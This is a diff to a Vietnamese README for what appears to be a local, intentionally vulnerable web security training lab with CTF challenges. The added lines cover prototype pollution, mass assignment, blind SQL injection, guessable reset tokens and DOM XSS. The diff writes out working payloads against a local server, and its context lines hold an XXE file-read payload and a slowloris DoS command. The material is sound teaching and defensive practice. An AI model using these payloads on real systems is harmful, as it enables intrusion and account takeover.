@@ -10,8 +10,8 @@ npm run doctor                              # kiểm tra môi trường
 npm run serve                               # lab VULN    → http://127.0.0.1:3000
 npm run serve -- --port 3001                # lab VULN    ở port khác
 npm run serve:hardened                      # lab HARDENED → http://127.0.0.1:3000
-npm test                                    # 115 test (guard, ratelimiter, app, jwt, scraper, flowload, unit-gaps…)
-npm run e2e                                 # 54 check E2E HTTP — tự khởi động 3 server, đối chứng vuln/hardened
+npm test                                    # 134 test (guard, ratelimiter, app, jwt, scraper, flowload, lab16-20, unit-gaps…)
+npm run e2e                                 # 59 check E2E HTTP — tự khởi động 3 server, đối chứng vuln/hardened
 
 node src/cli.js labs                        # danh sách bài thực hành
 node src/cli.js hub                         # Hub học SecHub → http://127.0.0.1:4000
@@ -25,7 +25,7 @@ node src/cli.js slowloris http://127.0.0.1:3000 --sockets 100 --duration 20
 node src/cli.js crawl --url=https://example.com --max-pages=20 --depth=2    # web CÔNG KHAI, lịch sự
 node src/cli.js crawl --url=http://127.0.0.1:3000 --i-own-this-target       # tập trên lab (guard ngược chiều)
 node src/cli.js detect http://127.0.0.1:3000                                # blue-team: đọc /_lab/log, nhận diện tấn công
-node src/cli.js challenge http://127.0.0.1:3000                             # CTF: 7 thử thách / 170 điểm
+node src/cli.js challenge http://127.0.0.1:3000                             # CTF: 10 thử thách / 265 điểm
 node src/cli.js codec encode b64 "xinchao"                                  # codec: b64/hex/url/rot13/sha256
 
 # dải mạng riêng (10.x/172.16-31.x/192.168.x) — chỉ khi bạn SỞ HỮU hệ thống:
@@ -53,10 +53,15 @@ node src/cli.js scan http://192.168.1.50:3000 --i-own-this-target
 | `POST /upload` + `GET /uploads/` | **Unrestricted Upload** — .html chạy script | whitelist ext + ép text/plain |
 | `POST /api/import` | **XXE** (mô phỏng trên VFS) | 400 với DOCTYPE |
 | `GET/POST /guestbook` | **Stored XSS** | escape output |
+| `POST /api/config` (+ GET) | **Prototype Pollution** — `{"__proto__":{...}}` nhiễm Object.prototype | safeMerge lọc `__proto__/constructor/prototype` |
+| `POST /api/register` | **Mass Assignment** — copy cả `?role=admin` vào user | whitelist username+password, role cứng 'user' |
+| `GET /track?code=` | **Blind SQLi** — oracle boolean 200/404 | parameterized query |
+| `GET/POST /api/reset/*` | **Reset token đoán được** — md5(username) | randomBytes 128-bit + TTL + one-time |
+| `GET /dom` | **DOM XSS** — `location.hash` → `innerHTML` | `textContent` |
 | `GET /slow?ms=` | endpoint chậm 3s (mồi cho DoS demo) | vẫn chậm, nhưng rate limit bảo vệ |
 | `GET /_lab/metrics` | bộ đếm request (dụng cụ học tập) | có |
 | `GET /_lab/log` | log request cho module `detect` | có |
-| `GET /_lab/challenges` + `/_lab/verify` | CTF: 7 thử thách, 170 điểm | CTF tắt (đã vá) |
+| `GET /_lab/challenges` + `/_lab/verify` | CTF: 10 thử thách, 265 điểm | CTF tắt (đã vá) |
 | mọi 404/500 | phản chiếu URL / stack trace | trang lỗi chung chung |
 | headers & cookie | thiếu CSP/nosniff…, cookie không cờ | đầy đủ |
 
@@ -109,6 +114,26 @@ curl -X POST .../api/import -d '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///secrets.
 
 # Stored XSS (LAB-15)
 curl -X POST .../guestbook -d "msg=<svg/onload=alert(1)>"
+
+# Prototype Pollution (LAB-16) — nhiễm Object.prototype toàn cục
+curl -X POST .../api/config -H 'content-type: application/json' -d '{"__proto__":{"isAdmin":true}}'
+curl .../api/config          # → protoPolluted:["isAdmin"] + cờ CTF #8
+
+# Mass Assignment (LAB-17) — tự cấp role admin
+curl -X POST ".../api/register?role=admin" -d "username=x&password=pw12345"
+# login → GET /api/me → cờ CTF #9
+
+# Blind SQLi (LAB-18) — oracle boolean, rút cờ từng ký tự (CTF #10, 40đ)
+/track?code=AB-100' AND 1=1 --                                    # → 200
+/track?code=AB-100' AND 1=2 --                                    # → 404
+/track?code=AB-100' AND (SELECT substr(flag,1,1) FROM ctf_blind)='F' --  # → 200 ✓
+
+# Reset token đoán được (LAB-19) — md5(username)[0:12], chiếm account
+curl ".../api/reset/request?user=carol"        # token lộ ngay response
+curl -X POST .../api/reset/confirm -d "user=dave&token=<md5(dave)[0:12]>&newpass=x"
+
+# DOM XSS (LAB-20) — payload trong #fragment, KHÔNG lên server
+/dom#<img src=x onerror=alert(document.domain)>        # mở trong trình duyệt
 
 # So sánh rate limit
 loadtest --path=slow --rps 40   →  vuln: 200 nghẽn 3s   |   hardened: 429 dồn dập
